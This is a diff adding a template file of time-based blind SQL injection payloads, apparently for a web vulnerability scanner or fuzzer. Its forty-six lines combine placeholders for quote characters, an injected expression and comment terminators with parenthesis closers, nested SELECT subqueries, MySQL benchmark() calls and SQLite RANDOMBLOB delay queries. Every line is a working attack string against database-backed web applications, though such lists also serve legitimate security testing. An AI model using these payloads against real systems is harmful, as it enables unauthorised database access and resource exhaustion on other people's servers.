@@ -1,0 +1,46 @@
+{quote} {sqli}{comment}
+{sqli}{comment}
+1 or {sqli}{comment}
+{quote} or {sqli}{comment}
+{quote} or {sqli}={quote}
+1) or {sqli}{comment}
+{quote}) or {sqli}={quote}
+1)) or {sqli}{comment}
+{quote})) or {sqli}={quote}
+;{sqli}{comment}
+);{sqli}{comment}
+{quote};{sqli}{comment}
+{quote});{sqli}{comment}
+));{sqli}{comment}
+{quote}));{sqli}{comment}
+{quote}) or {sqli}{comment}
+{quote})) or {sqli}{comment}
+AND (SELECT * FROM (SELECT({sqli}))bAKL) AND {quote}vRxe{quote}={quote}vRxe
+AND (SELECT * FROM (SELECT({sqli}))YjoC) AND {quote}%{quote}={quote}
+AND (SELECT * FROM (SELECT({sqli}))nQIP)
+AND (SELECT * FROM (SELECT({sqli}))nQIP){comment}
+{sqli}={quote}
+or {sqli}
+or {sqli}{comment}
+or {sqli}={quote}
+{sqli}
+{quote}\{quote}
+AnD {sqli}
+AnD {sqli}{comment}
+&&{sqli}
+&&{sqli}{comment}
+{quote} AnD {sqli} ANd {quote}1
+{quote}&&{sqli}&&{quote}1
+ORDER BY {sqli}
+ORDER BY {sqli}{comment}
+(SELECT * FROM (SELECT({sqli}))ecMj)
+(SELECT * FROM (SELECT({sqli}))ecMj){comment}
++benchmark(3200,SHA1(1))+{quote}
++ {sqli} + {quote}
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(1000000000/2))))
+{sqli}/*{quote} or {sqli} or {quote}{quote} or {sqli} or {quote}*/
